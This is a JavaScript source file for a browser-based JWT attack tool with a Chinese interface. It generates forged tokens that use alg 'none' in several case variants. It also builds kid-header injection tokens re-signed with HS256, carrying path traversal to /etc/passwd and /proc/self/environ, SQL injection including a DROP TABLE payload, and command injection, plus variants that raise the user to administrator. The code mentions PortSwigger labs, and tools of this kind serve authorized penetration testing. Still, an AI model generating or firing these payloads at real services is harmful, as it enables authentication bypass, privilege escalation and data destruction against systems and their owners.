/* JWTAuditor - JWT攻击平台 (生产版本) */

// 生产环境JWT攻击平台 - 仅启用无算法绕过攻击
window.jwtAttackPlatform = {
    selectedAttack: null,
    generatedPayloads: [],
    
    init: function() {
        this.disableUnavailableAttacks();
        this.bindEvents();
    },
    
    disableUnavailableAttacks: function() {
        const unavailableAttacks = document.querySelectorAll('.attack-card:not([data-attack="none-bypass"])');
        unavailableAttacks.forEach(card => {
            card.classList.add('disabled');
            card.onclick = (e) => {
                if (!card.classList.contains('disabled')) return;
                e.preventDefault();
                e.stopPropagation();
                
                const attackName = card.querySelector('h5').textContent.replace('算法混淆', '').replace('参数注入', '').replace('操控', '').replace('注入', '').trim();
                this.showComingSoonNotification(attackName);
            };
        });
    },
    
    showComingSoonNotification: function(attackName) {
        const notification = document.createElement('div');
        notification.className = 'notification-overlay';
        notification.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px;
            z-index: 10000;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 90%;
            text-align: center;
        `;
        
        notification.innerHTML = `
            <h3 style="color: var(--primary-color); margin-bottom: 15px;">🔒 攻击功能即将推出</h3>
            <p style="color: var(--text-primary); margin-bottom: 15px;">
                <strong>${attackName}</strong> 正在开发中，将在未来的更新中提供。
            </p>
            <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 20px;">
                目前您可以使用<strong>无算法绕过</strong>攻击，该功能已完全可用。
            </p>
            <button onclick="this.parentElement.remove()" style="
                background: var(--primary-color);
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 4px;
                cursor: pointer;
                font-weight: 500;
            ">确定</button>
        `;
        
        document.body.appendChild(notification);
        
        // 5秒后自动关闭
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    },
    
    bindEvents: function() {
        document.addEventListener('click', (e) => {
            const attacksTab = document.getElementById('attacks');
            const clickedInAttacksTab = attacksTab && attacksTab.contains(e.target);
            const clickedOnAttackCard = e.target.closest('.attack-card');
            
            if (!clickedInAttacksTab && !clickedOnAttackCard) {
                return;
            }
            
            if (e.target.closest('.attack-card')) {
                const attackCard = e.target.closest('.attack-card');
                if (attackCard.classList.contains('disabled')) {
                    return;
                }
                
                const attackType = attackCard.getAttribute('data-attack');
                this.selectAttack(attackType);
            } else if (e.target.closest('#attack-back-btn') || e.target.closest('#results-back-btn')) {
                this.goBack();
            } else if (e.target.closest('#generate-new-attack')) {
                this.backToConfiguration();
            } else if (e.target.id === 'export-payloads' || e.target.textContent.includes('导出所有载荷') || e.target.textContent.includes('Export All Payloads')) {
                this.exportAllPayloads();
            } else if (e.target.id === 'export-clean-payloads' || e.target.textContent.includes('导出纯净令牌') || e.target.textContent.includes('Export Clean Tokens')) {
                this.exportCleanTokens();
            } else if (e.target.closest('.generate-attack-btn')) {
                this.generateAttackPayloads().catch(error => {
                    console.error('攻击生成失败:', error);
                    this.showError(`攻击生成失败: ${error.message}`);
                });
            } else if (e.target.closest('.copy-payload-icon')) {
                const payload = decodeURIComponent(e.target.closest('.copy-payload-icon').getAttribute('data-payload'));
                this.copyToClipboard(payload);
            }
        });
        
        // 监听复选框变化事件
        document.addEventListener('change', (e) => {
            if (e.target.id === 'modify-payload-none') {
                const container = document.getElementById('custom-claims-container-none');
                container.style.display = e.target.checked ? 'block' : 'none';
            } else if (e.target.id === 'modify-payload-kid') {
                const container = document.getElementById('custom-claims-group-kid');
                container.style.display = e.target.checked ? 'block' : 'none';
            }
        });
    },
    
    selectAttack: function(attackType) {
        this.selectedAttack = attackType;
        
        const attackSelection = document.getElementById('attack-selection');
        const attackConfiguration = document.getElementById('attack-configuration');
        const configContent = document.getElementById('attack-config-content');
        const configTitle = document.getElementById('attack-config-title');
        
        if (attackSelection && attackConfiguration && configContent) {
            attackSelection.classList.remove('active');
            attackConfiguration.classList.add('active');
            this.currentStep = 'attack-configuration';
            
            const attackNames = {
                'none-bypass': '无算法绕过',
                'algo-confusion': '算法混淆',
                'kid-injection': 'Kid参数注入',
                'jku-manipulation': 'JKU操控',
                'jwk-injection': 'JWK头部注入',
                'privilege-escalation': '权限提升',
                'claim-spoofing': '声明伪造'
            };
            
            configTitle.textContent = `配置${attackNames[attackType] || attackType}攻击`;
            
            // 根据攻击类型生成配置内容
            const configGenerators = {
                'none-bypass': this.generateNoneBypassConfig,
                'kid-injection': this.generateKidInjectionConfig,
                'algo-confusion': this.generateAlgoConfusionConfig,
                'jku-manipulation': this.generateJkuManipulationConfig,
                'jwk-injection': this.generateJwkInjectionConfig,
                'privilege-escalation': this.generatePrivilegeEscalationConfig,
                'claim-spoofing': this.generateClaimSpoofingConfig
            };
            
            const config = configGenerators[attackType] ? {
                title: configTitle.textContent,
                content: configGenerators[attackType].bind(this)
            } : null;
            
            if (config) {
                configTitle.textContent = config.title;
                configContent.innerHTML = config.content();
            }
        }
    },
    
    generateNoneBypassConfig: function() {
        return `
            <div class="config-section">
                <h4>🚫 无算法绕过攻击</h4>
                <p class="attack-description">
                    此攻击通过将算法设置为"none"来移除签名验证。
                    许多JWT库会接受alg为"none"的令牌并完全跳过签名验证。
                </p>
                
                <div class="config-group">
                    <label for="original-token-none">原始JWT令牌 *</label>
                    <textarea id="original-token-none" placeholder="在此粘贴您的JWT令牌..." rows="4"></textarea>
                    <small class="field-hint">📝 粘贴您想要修改的JWT令牌</small>
                </div>
                
                <div class="config-group">
                    <label class="checkbox-label">
                        <input type="checkbox" id="modify-payload-none">
                        <span class="checkmark"></span>
                        修改载荷声明
                    </label>
                    <small class="field-hint">🔧 选中此项可在载荷中添加或修改声明</small>
                </div>
                
                <div class="config-group" id="custom-claims-container-none" style="display: none;">
                    <label for="custom-claims-none">自定义声明 (JSON)</label>
                    <textarea id="custom-claims-none" placeholder='{"sub": "admin", "role": "administrator"}' rows="3"></textarea>
                    <small class="field-hint">🎯 以JSON格式添加自定义声明。这些将与现有载荷合并。</small>
                </div>
                
                <div class="config-actions">
                    <button class="generate-attack-btn primary-btn">
                        <i class="fas fa-rocket"></i> 生成无算法绕过载荷
                    </button>
                </div>
            </div>
        `;
    },
    
    generateKidInjectionConfig: function() {
        return `
            <div class="config-section">
                <h4>💉 Kid参数注入攻击</h4>
                <p class="attack-description">
                    此攻击利用JWT头部中的"kid"(密钥ID)参数进行SQL注入、
                    路径遍历和命令注入漏洞。攻击针对使用kid值从数据库或
                    文件系统检索密钥的应用程序。
                </p>

                <div class="config-group">
                    <label for="original-token-kid">原始JWT令牌 *</label>
                    <textarea id="original-token-kid" placeholder="在此粘贴您的JWT令牌..." rows="4"></textarea>
                    <small class="field-hint">📝 粘贴您想要修改的JWT令牌</small>
                </div>

                <div class="config-group checkbox-group">
                    <label>
                        <input type="checkbox" id="modify-payload-kid" checked>
                        <span class="checkmark"></span>
                        修改令牌载荷
                    </label>
                    <small class="field-hint">🔧 启用载荷修改以进行权限提升</small>
                </div>

                <div class="config-group" id="custom-claims-group-kid">
                    <label for="custom-claims-kid">自定义声明 (JSON)</label>
                    <textarea id="custom-claims-kid" placeholder='{"sub": "admin", "role": "administrator", "iat": 9999999999}' rows="3"></textarea>
                    <small class="field-hint">⚡ 添加自定义声明以测试权限提升</small>
                </div>

                <div class="config-group">
                    <label for="target-file-kid">目标文件路径 (可选)</label>
                    <input type="text" id="target-file-kid" placeholder="/etc/passwd">
                    <small class="field-hint">🎯 为路径遍历攻击指定自定义目标文件</small>
                </div>

                <div class="attack-info">
                    <h5>🔍 生成的攻击向量:</h5>
                    <ul>
                        <li><strong>SQL注入:</strong> 用于数据库密钥检索的经典SQL注入载荷</li>
                        <li><strong>路径遍历:</strong> 访问系统文件的目录遍历</li>
                        <li><strong>命令注入:</strong> 通过kid参数执行OS命令</li>
                        <li><strong>文件系统:</strong> 访问敏感系统文件和日志</li>
                        <li><strong>Web应用程序:</strong> 框架特定的配置文件</li>
                    </ul>
                </div>

                <div class="config-actions">
                    <button class="generate-attack-btn" data-attack="kid-injection">
                        <i class="fas fa-rocket"></i> 生成KID注入载荷
                    </button>
                </div>
            </div>
        `;
    },

    async generateAttackPayloads() {
        const payloadGenerators = {
            'none-bypass': () => this.generateNoneBypassPayloads(),
            'kid-injection': () => this.generateKidInjectionPayloads(),
            'algo-confusion': () => this.generateAlgoConfusionPayloads(),
            'jku-manipulation': () => this.generateJkuManipulationPayloads(),
            'jwk-injection': () => this.generateJwkInjectionPayloads(),
            'privilege-escalation': () => this.generatePrivilegeEscalationPayloads(),
            'claim-spoofing': () => this.generateClaimSpoofingPayloads()
        };

        const generator = payloadGenerators[this.selectedAttack];
        if (generator) {
            try {
                // 显示加载状态
                const generateBtn = document.querySelector('.generate-attack-btn');
                if (generateBtn) {
                    generateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 生成和签名载荷中...';
                    generateBtn.disabled = true;
                }

                await generator();

                // 重置按钮状态
                if (generateBtn) {
                    generateBtn.innerHTML = '<i class="fas fa-rocket"></i> 生成攻击载荷';
                    generateBtn.disabled = false;
                }

                if (this.generatedPayloads.length > 0) {
                    this.showResults();
                } else {
                    this.showError('未生成载荷。请检查您的配置。');
                }
            } catch (error) {
                this.showError(`生成载荷失败: ${error.message}`);

                // 错误时重置按钮状态
                const generateBtn = document.querySelector('.generate-attack-btn');
                if (generateBtn) {
                    generateBtn.innerHTML = '<i class="fas fa-rocket"></i> 生成攻击载荷';
                    generateBtn.disabled = false;
                }
            }
        }
    },
    
    generateNoneBypassPayloads: function() {
        const token = document.getElementById('original-token-none')?.value?.trim();
        const modifyPayload = document.getElementById('modify-payload-none')?.checked;
        const customClaims = document.getElementById('custom-claims-none')?.value?.trim();
        
        if (!token) {
            this.showError('请提供原始JWT令牌');
            return;
        }
        
        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];
            
            // 准备载荷变体
            let basePayload = { ...decodedToken.payload };
            
            // 应用自定义声明（如果指定）
            if (modifyPayload && customClaims) {
                try {
                    const cleanedClaims = customClaims.trim();
                    const additionalClaims = JSON.parse(cleanedClaims);
                    basePayload = { ...basePayload, ...additionalClaims };
                } catch (e) {
                    this.showError(`自定义声明中的无效JSON: ${e.message}。请检查您的JSON格式。`);
                }
            }
            
            // 生成无算法变体
            const noneVariations = [
                { alg: 'none', description: '标准none算法' },
                { alg: 'None', description: '大写None' },
                { alg: 'NONE', description: '大写NONE' },
                { alg: 'nOnE', description: '混合大小写nOnE' }
            ];
            
            noneVariations.forEach(variation => {
                const header = { ...decodedToken.header, alg: variation.alg };
                
                // 如果存在则删除typ（某些实现更严格）
                const headerWithoutTyp = { ...header };
                delete headerWithoutTyp.typ;
                
                // 生成带有和不带签名的令牌
                [header, headerWithoutTyp].forEach((headerVariant, index) => {
                    const encodedHeader = this.base64UrlEncode(JSON.stringify(headerVariant));
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(basePayload));
                    
                    // 不带签名的令牌
                    const tokenWithoutSig = `${encodedHeader}.${encodedPayload}.`;
                    
                    // 带空签名的令牌  
                    const tokenWithEmptySig = `${encodedHeader}.${encodedPayload}`;
                    
                    const headerType = index === 0 ? '带typ' : '不带typ';
                    
                    this.generatedPayloads.push({
                        title: `🚫 无算法 (${variation.description}, ${headerType}) - 无签名`,
                        payload: tokenWithoutSig,
                        description: `使用alg: "${variation.alg}" ${headerType}的无算法绕过，以空签名结尾`,
                        explanation: `此载荷通过将算法设置为"${variation.alg}"来移除签名验证。令牌以句号和空签名部分结尾。`,
                        testMethod: '将此令牌提交到通常需要JWT签名验证的端点。'
                    });
                    
                    this.generatedPayloads.push({
                        title: `🚫 无算法 (${variation.description}, ${headerType}) - 缺失签名`,
                        payload: tokenWithEmptySig,
                        description: `使用alg: "${variation.alg}" ${headerType}的无算法绕过，完全缺少签名部分`,
                        explanation: `此载荷通过将算法设置为"${variation.alg}"来移除签名验证。令牌完全没有签名部分。`,
                        testMethod: '将此令牌提交到通常需要JWT签名验证的端点。'
                    });
                });
            });
            
        } catch (error) {
            this.showError(`处理无算法绕过失败: ${error.message}`);
        }
    },

    async generateKidInjectionPayloads() {
        const token = document.getElementById('original-token-kid')?.value?.trim();
        const modifyPayload = document.getElementById('modify-payload-kid')?.checked;
        const customClaims = document.getElementById('custom-claims-kid')?.value?.trim();
        const targetFile = document.getElementById('target-file-kid')?.value?.trim() || '/dev/null';

        if (!token) {
            this.showError('请提供原始JWT令牌');
            return;
        }

        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];

            // 准备载荷变体
            let basePayload = { ...decodedToken.payload };

            // 应用自定义声明（如果指定）
            if (modifyPayload && customClaims) {
                try {
                    const cleanedClaims = customClaims.trim();
                    const additionalClaims = JSON.parse(cleanedClaims);
                    basePayload = { ...basePayload, ...additionalClaims };
                } catch (e) {
                    this.showError(`自定义声明中的无效JSON: ${e.message}。请检查您的JSON格式。`);
                    return;
                }
            }

            // PortSwigger实验室特定载荷 - 带有实际签名的路径遍历
            const pathTraversalPayloads = [
                { path: "/dev/null", desc: "空设备（空密钥）" },
                { path: "../../../../../../../dev/null", desc: "深层遍历到/dev/null" },
                { path: "../../../../../../../../dev/null", desc: "超深层遍历" },
                { path: "/proc/self/environ", desc: "进程环境变量" },
                { path: "/etc/passwd", desc: "Unix passwd文件" },
                { path: "../../../etc/passwd", desc: "passwd的相对路径" },
                { path: "/proc/version", desc: "系统版本信息" },
                { path: "", desc: "空字符串（空密钥）" },
                { path: " ", desc: "单个空格字符" },
            ];

            // SQL注入载荷（用于存储密钥的数据库）
            const sqlPayloads = [
                { path: "' OR 1=1--", desc: "经典SQL注入", key: "secret" },
                { path: "' UNION SELECT 'secret'--", desc: "联合注入与已知密钥", key: "secret" },
                { path: "'; DROP TABLE keys;--", desc: "破坏性SQL注入", key: "secret" },
            ];

            // 命令注入载荷
            const commandPayloads = [
                { path: "; echo 'secret'", desc: "命令注入echo", key: "secret" },
                { path: "| echo secret", desc: "管道命令注入", key: "secret" },
                { path: "`echo secret`", desc: "命令替换", key: "secret" },
            ];

            // 生成带适当签名的路径遍历攻击
            for (const payload of pathTraversalPayloads) {
                const header = { ...decodedToken.header };
                header.kid = payload.path;
                header.alg = 'HS256'; // 强制HMAC算法

                const signingKey = this.getFileBasedSigningKey(payload.path);

                try {
                    const signedToken = await this.signJwtHmac(header, basePayload, signingKey, 'HS256');

                    this.generatedPayloads.push({
                        title: `📁 路径遍历 - ${payload.desc}`,
                        payload: signedToken,
                        description: `KID路径遍历: ${payload.path}`,
                        explanation: `此载荷使用路径遍历使服务器将文件内容用作HMAC密钥。KID: "${payload.path}"。令牌使用预期的文件内容(${signingKey instanceof Uint8Array ? '空字节' : signingKey})进行适当签名。`,
                        testMethod: `提交此适当签名的令牌。如果服务器使用"${payload.path}"的文件内容作为HMAC密钥，则应接受它。`
                    });

                    // 添加管理员权限提升版本
                    if (basePayload.sub && basePayload.sub !== 'administrator') {
                        const adminPayload = { ...basePayload, sub: 'administrator' };
                        const adminToken = await this.signJwtHmac(header, adminPayload, signingKey, 'HS256');

                        this.generatedPayloads.push({
                            title: `🔐 通过${payload.desc}提升管理员权限`,
                            payload: adminToken,
                            description: `使用KID的管理员权限提升: ${payload.path}`,
                            explanation: `此载荷结合了路径遍历和权限提升。将subject更改为"administrator"并使用"${payload.path}"的文件内容进行签名。`,
                            testMethod: `提交此令牌以获取管理员访问权限。非常适合PortSwigger实验室场景。`
                        });
                    }
                } catch (signingError) {
                    console.warn(`未能为${payload.path}签名令牌:`, signingError);
                }
            }

            // SQL注入攻击（使用预测密钥签名）
            for (const payload of sqlPayloads) {
                const header = { ...decodedToken.header };
                header.kid = payload.path;
                header.alg = 'HS256';

                try {
                    const signedToken = await this.signJwtHmac(header, basePayload, payload.key, 'HS256');

                    this.generatedPayloads.push({
                        title: `🗄️ SQL注入 - ${payload.desc}`,
                        payload: signedToken,
                        description: `KID中的SQL注入: ${payload.path}`,
                        explanation: `此载荷在KID参数中使用SQL注入。使用预测密钥"${payload.key}"进行签名。`,
                        testMethod: `如果应用程序从数据库检索密钥，请提交此令牌。监控SQL错误或成功身份验证。`
                    });
                } catch (signingError) {
                    console.warn(`未能签名SQL注入令牌:`, signingError);
                }
            }

            // 命令注入攻击
            for (const payload of commandPayloads) {
                const header = { ...decodedToken.header };
                header.kid = payload.path;
                header.alg = 'HS256';

                try {
                    const signedToken = await this.signJwtHmac(header, basePayload, payload.key, 'HS256');

                    this.generatedPayloads.push({
                        title: `⚡ 命令注入 - ${payload.desc}`,
                        payload: signedToken,
                        description: `KID中的命令注入: ${payload.path}`,
                        explanation: `此载荷在KID参数中使用命令注入。使用预期输出"${payload.key}"进行签名。`,
                        testMethod: `如果应用程序在命令上下文中处理KID，请提交此令牌。监控命令执行或身份验证成功。`
                    });
                } catch (signingError) {
                    console.warn(`未能签名命令注入令牌:`, signingError);
                }
            }

            // 自定义目标文件（如果提供）
            if (targetFile && targetFile !== '/dev/null') {
                const header = { ...decodedToken.header };
                header.kid = targetFile;
                header.alg = 'HS256';

                const customKey = this.getFileBasedSigningKey(targetFile);

                try {
                    const customToken = await this.signJwtHmac(header, basePayload, customKey, 'HS256');

                    this.generatedPayloads.push({
                        title: `🎯 自定义目标 - ${targetFile}`,
                        payload: customToken,
                        description: `自定义文件定位: ${targetFile}`,
                        explanation: `此载荷定位您的自定义文件: "${targetFile}"。使用预测的文件内容进行适当签名。`,
                        testMethod: `提交此令牌并监控使用自定义文件作为密钥的成功身份验证。`
                    });
                } catch (signingError) {
                    console.warn(`未能签名自定义目标令牌:`, signingError);
                }
            }

        } catch (error) {
            this.showError(`处理KID注入攻击失败: ${error.message}`);
        }
    },
    
    getTestingGuidance: function(category) {
        const guidance = {
            'SQL注入': '数据库错误、延迟响应或未授权访问',
            '路径遍历': '文件系统错误、身份验证绕过或敏感数据泄露',
            '命令注入': '响应中的命令输出、延迟响应或系统损害',
            '文件系统': '文件访问错误、系统信息泄露或身份验证绕过',
            'Web应用程序': '配置错误、数据库凭据或应用程序密钥'
        };
        return guidance[category] || '异常应用程序行为或安全漏洞';
    },
    
    showResults: function() {
        const attackConfiguration = document.getElementById('attack-configuration');
        const attackResults = document.getElementById('attack-results');
        const resultsContent = document.getElementById('attack-results-content');
        
        if (!attackConfiguration || !attackResults || !resultsContent) {
            return;
        }
        
        // 隐藏配置，显示结果
        attackConfiguration.classList.remove('active');
        attackResults.classList.add('active');
        
        // 更新当前步骤
        this.currentStep = 'attack-results';
        
        // 生成结果HTML
        let html = `
            <div class="results-summary">
                <h4>🎯 生成了${this.generatedPayloads.length}个攻击载荷</h4>
                <p>下面的每个载荷都代表${this.selectedAttack}攻击的不同变体。</p>
            </div>
        `;
        
        this.generatedPayloads.forEach((payloadData, index) => {
            html += `
                <div class="payload-result">
                    <h5 class="payload-title">${payloadData.title}</h5>
                    <div class="payload-container">
                        <div class="payload-token">${payloadData.payload}</div>
                        <button class="copy-payload-icon" data-payload="${encodeURIComponent(payloadData.payload)}" title="复制载荷">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="payload-info">
                        <div class="payload-description">
                            <strong>描述:</strong> ${payloadData.description}
                        </div>
                        <div class="payload-explanation">
                            <strong>工作原理:</strong> ${payloadData.explanation}
                        </div>
                        <div class="payload-test-method">
                            <strong>测试方法:</strong> ${payloadData.testMethod}
                        </div>
                    </div>
                </div>
            `;
        });
        
        resultsContent.innerHTML = html;
    },
    
    goBack: function() {
        if (this.currentStep === 'attack-configuration') {
            // 返回攻击选择
            const attackConfiguration = document.getElementById('attack-configuration');
            const attackSelection = document.getElementById('attack-selection');
            
            if (attackConfiguration && attackSelection) {
                attackConfiguration.classList.remove('active');
                attackSelection.classList.add('active');
                this.currentStep = 'attack-selection';
                this.selectedAttack = null;
            }
        } else if (this.currentStep === 'attack-results') {
            // 返回配置
            this.backToConfiguration();
        }
    },
    
    backToConfiguration: function() {
        const attackResults = document.getElementById('attack-results');
        const attackConfiguration = document.getElementById('attack-configuration');
        
        if (attackResults && attackConfiguration) {
            attackResults.classList.remove('active');
            attackConfiguration.classList.add('active');
            this.currentStep = 'attack-configuration';
        }
    },
    
    exportAllPayloads: function() {
        if (this.generatedPayloads.length === 0) {
            this.showError('没有要导出的载荷。请先生成攻击载荷。');
            return;
        }
        
        let exportContent = `JWT攻击平台 - ${this.selectedAttack} 导出\n`;
        exportContent += `生成时间: ${new Date().toLocaleString()}\n`;
        exportContent += `载荷总数: ${this.generatedPayloads.length}\n\n`;
        exportContent += '=' .repeat(80) + '\n\n';
        
        this.generatedPayloads.forEach((payload, index) => {
            exportContent += `${index + 1}. ${payload.title}\n`;
            exportContent += `描述: ${payload.description}\n`;
            exportContent += `说明: ${payload.explanation}\n`;
            exportContent += `测试方法: ${payload.testMethod}\n`;
            exportContent += `载荷: ${payload.payload}\n\n`;
        });
        
        this.downloadFile(exportContent, `jwt-attack-${this.selectedAttack}-${Date.now()}.txt`);
    },
    
    exportCleanTokens: function() {
        if (this.generatedPayloads.length === 0) {
            this.showError('没有要导出的令牌。请先生成攻击载荷。');
            return;
        }
        
        const tokensOnly = this.generatedPayloads.map(p => p.payload).join('\n');
        this.downloadFile(tokensOnly, `jwt-tokens-${this.selectedAttack}-${Date.now()}.txt`);
    },
    
    downloadFile: function(content, filename) {
        const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    },
    
    copyToClipboard: function(text) {
        navigator.clipboard.writeText(text).then(() => {
            this.showNotification('载荷已复制到剪贴板！', 'success');
        }).catch(err => {
            this.showError('复制失败: ' + err);
        });
    },
    
    showError: function(message) {
        this.showNotification(message, 'error');
    },
    
    showNotification: function(message, type = 'info') {
        // 移除现有的通知
        const existing = document.querySelector('.notification-toast');
        if (existing) existing.remove();
        
        const toast = document.createElement('div');
        toast.className = `notification-toast notification-${type}`;
        toast.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${type === 'error' ? 'exclamation-circle' : type === 'success' ? 'check-circle' : 'info-circle'}"></i>
                <span>${message}</span>
            </div>
            <button class="notification-close" onclick="this.parentElement.remove()">&times;</button>
        `;
        
        toast.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${type === 'error' ? 'var(--error-bg)' : type === 'success' ? 'var(--success-bg)' : 'var(--info-bg)'};
            color: white;
            padding: 15px 20px;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 10000;
            display: flex;
            align-items: center;
            gap: 10px;
            min-width: 300px;
            max-width: 500px;
        `;
        
        document.body.appendChild(toast);
        
        // 5秒后自动消失
        setTimeout(() => {
            if (toast.parentNode) {
                toast.style.transition = 'opacity 0.3s ease';
                toast.style.opacity = '0';
                setTimeout(() => {
                    if (toast.parentNode) {
                        toast.remove();
                    }
                }, 300);
            }
        }, 5000);
    },
    
    // 辅助函数
    decodeJWT: function(jwt) {
        const parts = jwt.split('.');
        if (parts.length !== 3) {
            throw new Error('无效的JWT格式');
        }
        
        const header = JSON.parse(atob(parts[0]));
        const payload = JSON.parse(atob(parts[1]));
        
        return { header, payload, signature: parts[2] };
    },
    
    base64UrlEncode: function(str) {
        return btoa(str)
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    },
    
    signJwtHmac: async function(header, payload, secret, algorithm) {
        const encodedHeader = this.base64UrlEncode(JSON.stringify(header));
        const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
        
        // 使用Crypto.subtle进行签名
        const encoder = new TextEncoder();
        const keyMaterial = encoder.encode(secret);
        
        const cryptoKey = await crypto.subtle.importKey(
            'raw',
            keyMaterial,
            { name: 'HMAC', hash: { name: algorithm.replace('HS', 'SHA-') } },
            false,
            ['sign']
        );
        
        const data = encoder.encode(`${encodedHeader}.${encodedPayload}`);
        const signatureBuffer = await crypto.subtle.sign('HMAC', cryptoKey, data);
        
        const signatureArray = Array.from(new Uint8Array(signatureBuffer));
        const signature = signatureArray.map(byte => String.fromCharCode(byte)).join('');
        
        return `${encodedHeader}.${encodedPayload}.${this.base64UrlEncode(signature)}`;
    },
    
    getFileBasedSigningKey: function(filePath) {
        // 根据文件路径返回相应的签名密钥
        switch(filePath) {
            case '':
            case ' ':
                return filePath; // 空字符串或空格
            case '/dev/null':
                // 返回null字节
                return new Uint8Array(0);
            case '/etc/passwd':
            case '../../../etc/passwd':
                return 'root:x:0:0:root:/root:/bin/bash'; // 简化的passwd内容
            case '/proc/self/environ':
                return 'PATH=/usr/local/bin'; // 简化的环境变量
            case '/proc/version':
                return 'Linux version 5.4.0'; // 简化的版本信息
            default:
                // 对于路径遍历，返回基于路径的密钥
                return filePath.length > 0 ? filePath : 'default_key';
        }
    }
};

// 初始化攻击平台
document.addEventListener('DOMContentLoaded', () => {
    if (window.jwtAttackPlatform) {
        window.jwtAttackPlatform.init();
    }
});